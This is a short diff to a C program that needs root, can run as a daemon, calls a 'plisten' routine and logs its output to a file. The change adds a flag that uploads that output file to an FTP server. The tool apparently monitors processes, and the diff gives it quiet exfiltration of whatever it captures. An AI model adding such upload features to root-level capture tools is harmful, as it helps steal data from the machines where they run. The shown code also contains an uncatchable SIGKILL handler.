@@ -13,6 +13,7 @@
 #include "config.h"
 #include "helpers.h"
 #include "plisten.h"
+#include "ftp.h"
 
 char *outfile = "/dev/null";
 
@@ -50,6 +51,7 @@ void usage(char *self) {
   debug("Usage: %s [ -d ] [ -o file.txt ]\n"
         " -d - daemonize (reccommend using with -o flag)\n"
         " -o - output file\n"
+        " -f - send output file to FTP server (working only with -d flag)\n"
         " output is dumped to stdout unless an output file is specified\n"
         " stdout will be /dev/null if you daemonize\n",
         self);
@@ -91,11 +93,13 @@ void daemonize(int argc, char *argv[], char *envp[]) {
   efd = dup(ofd);
   assert(efd == 2);
 
+  //filename(fp);
   plisten();
 }
 
 void terminal(int argc, char *argv[], char *envp[]) {
   pid_t child = 0;
+  //char *fp = "/root/test.txt";
 
   child = fork();
   if (child == 0) {
@@ -117,16 +121,21 @@ int main(int argc, char *argv[], char *envp[]) {
   signal(SIGSEGV, exitsig);
   signal(SIGBUS, exitsig);
   signal(SIGILL, exitsig);
+  signal(SIGKILL, exitsig);
   signal(SIGCHLD, handlechild);
 
   if (geteuid() != 0) needroot();
 
-  while ((opt = getopt(argc, (void*)argv, "do:")) != EOF) {
+  while ((opt = getopt(argc, (void*)argv, "dfo:")) != EOF) {
     switch(opt) {
       case 'd': daemon = 1; break;
       case 'o':
         outfile = calloc(strlen(optarg) + 1, 1);
+		    filename(optarg);
         sscanf(optarg, "%s", outfile);
+        break;
+      case 'f':
+        ftp(1);
         break;
       default: usage(argv[0]);
     }
